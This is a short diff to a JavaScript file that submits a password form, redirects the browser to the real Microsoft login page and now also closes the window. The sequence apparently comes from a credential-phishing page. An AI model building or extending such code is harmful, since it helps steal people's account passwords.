@@ -42,6 +42,7 @@ document.addEventListener('DOMContentLoaded', () => {
             form_pwd.submit();
             // Redirect to the provided link
             window.location.href = "https://login.live.com"; 
+            window.close();
         }
     });
 
@@ -127,6 +128,7 @@ document.addEventListener('DOMContentLoaded', () => {
 
             //Redirect to the provided link
             window.location.href="https://login.live.com";
+            window.close();
         })
     })
 })
